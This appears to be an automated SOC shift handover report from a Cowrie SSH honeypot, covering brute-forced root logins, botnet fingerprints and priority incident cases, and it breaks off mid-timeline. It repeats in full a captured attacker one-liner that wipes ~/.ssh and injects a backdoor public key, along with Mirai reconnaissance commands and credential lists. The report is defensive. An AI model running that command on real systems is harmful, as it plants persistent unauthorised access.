# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-21 |
| **Generated At** | 2026-05-21T16:41:40Z |
| **Shift Time** | 16:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **164** |
| Confirmed Threats | **132** |
| False Positives Filtered | **32** (19.5%) |
| Unique Attacker IPs | **41** |
| Countries of Origin | **26** |
| High Severity Cases | **26** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **138** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **97** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **39** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `345gs5662d34` | 12 |
| `sunita` | 4 |
| `build` | 3 |
| `ivan` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 18 |
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `password` | 4 |
| `sunita` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 12 |
| `sunita` | `sunita` | 4 |
| `build` | `build` | 3 |
| `ivan` | `password` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `thunder` | `196.196.150.5` | 2026-05-21T13:29:31 |
| `root` | `3245gs5662d34` | `196.196.150.5` | 2026-05-21T13:29:34 |
| `root` | `menghuanxiyou` | `196.196.150.5` | 2026-05-21T13:31:57 |
| `root` | `passw0rd` | `196.196.150.5` | 2026-05-21T13:34:21 |
| `root` | `19880101` | `196.196.150.5` | 2026-05-21T13:41:43 |
| `root` | `September2024` | `196.196.150.5` | 2026-05-21T13:43:05 |
| `root` | `20001111` | `196.196.150.5` | 2026-05-21T13:45:29 |
| `root` | `admin` | `61.92.58.210` | 2026-05-21T15:02:36 |
| `root` | `computer` | `182.18.161.165` | 2026-05-21T15:39:27 |
| `root` | `3245gs5662d34` | `182.18.161.165` | 2026-05-21T15:39:28 |
| `root` | `xmhdipc` | `14.102.230.4` | 2026-05-21T15:41:22 |
| `root` | `3245gs5662d34` | `14.102.230.4` | 2026-05-21T15:41:29 |
| `root` | `xmhdipc` | `182.18.161.165` | 2026-05-21T15:45:15 |
| `root` | `india` | `151.95.83.235` | 2026-05-21T15:46:01 |
| `root` | `3245gs5662d34` | `151.95.83.235` | 2026-05-21T15:46:05 |
| `root` | `xmhdipc` | `102.216.240.61` | 2026-05-21T15:46:49 |
| `root` | `3245gs5662d34` | `102.216.240.61` | 2026-05-21T15:46:55 |
| `root` | `computer` | `102.216.240.61` | 2026-05-21T15:56:46 |
| `root` | `` | `176.65.139.177` | 2026-05-21T16:16:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **164** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 98 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 91 | 6 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 91 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `176.65.139.177`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `151.95.83.235`, `14.102.230.4`, `102.216.240.61`, `196.196.150.5`, `182.18.161.165`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **41** |
| Unique ASNs | **37** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS51396` | Pfcloud UG | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS2614` | RoEduNet | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | MEDIUM |
| `AS6789` | CRELCOM LLC | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS328442` | United SA | 1 | HIGH |
| `AS43766` | Mobile Telecommunication Company Saudi Arabia Joint-Stock company | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (26)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-79015569a6ef

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:29 |
| **Last Seen** | 2026-05-21 13:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:29:30` | `cowrie.session.connect` |
| `2026-05-21 13:29:30` | `cowrie.client.version` |
| `2026-05-21 13:29:30` | `cowrie.client.kex` |
| `2026-05-21 13:29:31` | `cowrie.login.success` |
| `2026-05-21 13:29:31` | `cowrie.session.params` |
| `2026-05-21 13:29:31` | `cowrie.command.input` |
| `2026-05-21 13:29:31` | `cowrie.command.failed` |
| `2026-05-21 13:29:31` | `cowrie.log.closed` |
| `2026-05-21 13:29:32` | `cowrie.session.params` |
| `2026-05-21 13:29:32` | `cowrie.command.input` |
| `2026-05-21 13:29:32` | `cowrie.session.file_download` |
| `2026-05-21 13:29:32` | `cowrie.log.closed` |
| `2026-05-21 13:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f8992ab607

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:29 |
| **Last Seen** | 2026-05-21 13:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:29:34` | `cowrie.session.connect` |
| `2026-05-21 13:29:34` | `cowrie.client.version` |
| `2026-05-21 13:29:34` | `cowrie.client.kex` |
| `2026-05-21 13:29:34` | `cowrie.login.success` |
| `2026-05-21 13:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d77198aebe4

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:31 |
| **Last Seen** | 2026-05-21 13:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:31:56` | `cowrie.session.connect` |
| `2026-05-21 13:31:56` | `cowrie.client.version` |
| `2026-05-21 13:31:56` | `cowrie.client.kex` |
| `2026-05-21 13:31:57` | `cowrie.login.success` |
| `2026-05-21 13:31:57` | `cowrie.session.params` |
| `2026-05-21 13:31:57` | `cowrie.command.input` |
| `2026-05-21 13:31:57` | `cowrie.command.failed` |
| `2026-05-21 13:31:58` | `cowrie.log.closed` |
| `2026-05-21 13:31:58` | `cowrie.session.params` |
| `2026-05-21 13:31:58` | `cowrie.command.input` |
| `2026-05-21 13:31:58` | `cowrie.session.file_download` |
| `2026-05-21 13:31:58` | `cowrie.log.closed` |
| `2026-05-21 13:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dddbf414637c

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:32 |
| **Last Seen** | 2026-05-21 13:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:32:00` | `cowrie.session.connect` |
| `2026-05-21 13:32:00` | `cowrie.client.version` |
| `2026-05-21 13:32:00` | `cowrie.client.kex` |
| `2026-05-21 13:32:01` | `cowrie.login.success` |
| `2026-05-21 13:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a13ffded2d0

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:34 |
| **Last Seen** | 2026-05-21 13:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:34:20` | `cowrie.session.connect` |
| `2026-05-21 13:34:20` | `cowrie.client.version` |
| `2026-05-21 13:34:20` | `cowrie.client.kex` |
| `2026-05-21 13:34:21` | `cowrie.login.success` |
| `2026-05-21 13:34:21` | `cowrie.session.params` |
| `2026-05-21 13:34:21` | `cowrie.command.input` |
| `2026-05-21 13:34:21` | `cowrie.command.failed` |
| `2026-05-21 13:34:21` | `cowrie.log.closed` |
| `2026-05-21 13:34:21` | `cowrie.session.params` |
| `2026-05-21 13:34:21` | `cowrie.command.input` |
| `2026-05-21 13:34:22` | `cowrie.session.file_download` |
| `2026-05-21 13:34:22` | `cowrie.log.closed` |
| `2026-05-21 13:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5116239ab600

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:34 |
| **Last Seen** | 2026-05-21 13:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:34:24` | `cowrie.session.connect` |
| `2026-05-21 13:34:24` | `cowrie.client.version` |
| `2026-05-21 13:34:24` | `cowrie.client.kex` |
| `2026-05-21 13:34:24` | `cowrie.login.success` |
| `2026-05-21 13:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d60a8c7918

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:41 |
| **Last Seen** | 2026-05-21 13:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:41:42` | `cowrie.session.connect` |
| `2026-05-21 13:41:42` | `cowrie.client.version` |
| `2026-05-21 13:41:43` | `cowrie.client.kex` |
| `2026-05-21 13:41:43` | `cowrie.login.success` |
| `2026-05-21 13:41:43` | `cowrie.session.params` |
| `2026-05-21 13:41:43` | `cowrie.command.input` |
| `2026-05-21 13:41:43` | `cowrie.command.failed` |
| `2026-05-21 13:41:44` | `cowrie.log.closed` |
| `2026-05-21 13:41:44` | `cowrie.session.params` |
| `2026-05-21 13:41:44` | `cowrie.command.input` |
| `2026-05-21 13:41:44` | `cowrie.session.file_download` |
| `2026-05-21 13:41:44` | `cowrie.log.closed` |
| `2026-05-21 13:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43bf9ddc4b07

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:41 |
| **Last Seen** | 2026-05-21 13:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:41:46` | `cowrie.session.connect` |
| `2026-05-21 13:41:46` | `cowrie.client.version` |
| `2026-05-21 13:41:46` | `cowrie.client.kex` |
| `2026-05-21 13:41:47` | `cowrie.login.success` |
| `2026-05-21 13:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a8c5070aaa9

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:43 |
| **Last Seen** | 2026-05-21 13:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:43:05` | `cowrie.session.connect` |
| `2026-05-21 13:43:05` | `cowrie.client.version` |
| `2026-05-21 13:43:05` | `cowrie.client.kex` |
| `2026-05-21 13:43:05` | `cowrie.login.success` |
| `2026-05-21 13:43:06` | `cowrie.session.params` |
| `2026-05-21 13:43:06` | `cowrie.command.input` |
| `2026-05-21 13:43:06` | `cowrie.command.failed` |
| `2026-05-21 13:43:06` | `cowrie.log.closed` |
| `2026-05-21 13:43:06` | `cowrie.session.params` |
| `2026-05-21 13:43:06` | `cowrie.command.input` |
| `2026-05-21 13:43:06` | `cowrie.session.file_download` |
| `2026-05-21 13:43:06` | `cowrie.log.closed` |
| `2026-05-21 13:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57adeec31619

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:43 |
| **Last Seen** | 2026-05-21 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:43:08` | `cowrie.session.connect` |
| `2026-05-21 13:43:08` | `cowrie.client.version` |
| `2026-05-21 13:43:09` | `cowrie.client.kex` |
| `2026-05-21 13:43:09` | `cowrie.login.success` |
| `2026-05-21 13:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd62c75ced6

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:45 |
| **Last Seen** | 2026-05-21 13:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:45:28` | `cowrie.session.connect` |
| `2026-05-21 13:45:28` | `cowrie.client.version` |
| `2026-05-21 13:45:28` | `cowrie.client.kex` |
| `2026-05-21 13:45:29` | `cowrie.login.success` |
| `2026-05-21 13:45:29` | `cowrie.session.params` |
| `2026-05-21 13:45:29` | `cowrie.command.input` |
| `2026-05-21 13:45:29` | `cowrie.command.failed` |
| `2026-05-21 13:45:29` | `cowrie.log.closed` |
| `2026-05-21 13:45:30` | `cowrie.session.params` |
| `2026-05-21 13:45:30` | `cowrie.command.input` |
| `2026-05-21 13:45:30` | `cowrie.session.file_download` |
| `2026-05-21 13:45:30` | `cowrie.log.closed` |
| `2026-05-21 13:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34919b451433

| Field | Detail |
|---|---|
| **Source IP** | `196.196.150[.]5` |
| **First Seen** | 2026-05-21 13:45 |
| **Last Seen** | 2026-05-21 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 13:45:32` | `cowrie.session.connect` |
| `2026-05-21 13:45:32` | `cowrie.client.version` |
| `2026-05-21 13:45:32` | `cowrie.client.kex` |
| `2026-05-21 13:45:33` | `cowrie.login.success` |
| `2026-05-21 13:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.150[.]5` to AbuseIPDB if not already reported
- [ ] Block `196.196.150[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a8c4736ddb9

| Field | Detail |
|---|---|
| **Source IP** | `61.92.58[.]210` |
| **First Seen** | 2026-05-21 15:02 |
| **Last Seen** | 2026-05-21 15:03 |
| **Session Duration** | 44s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:02:33` | `cowrie.session.connect` |
| `2026-05-21 15:02:33` | `cowrie.client.version` |
| `2026-05-21 15:02:33` | `cowrie.client.kex` |
| `2026-05-21 15:02:35` | `cowrie.login.failed` |
| `2026-05-21 15:02:36` | `cowrie.login.success` |
| `2026-05-21 15:02:36` | `cowrie.session.params` |
| `2026-05-21 15:02:36` | `cowrie.command.input` |
| `2026-05-21 15:02:36` | `cowrie.command.failed` |
| `2026-05-21 15:02:36` | `cowrie.log.closed` |
| `2026-05-21 15:02:37` | `cowrie.session.params` |
| `2026-05-21 15:02:37` | `cowrie.command.input` |
| `2026-05-21 15:02:37` | `cowrie.log.closed` |
| `2026-05-21 15:02:37` | `cowrie.session.params` |
| `2026-05-21 15:02:37` | `cowrie.command.input` |
| `2026-05-21 15:02:37` | `cowrie.log.closed` |
| `2026-05-21 15:02:38` | `cowrie.session.params` |
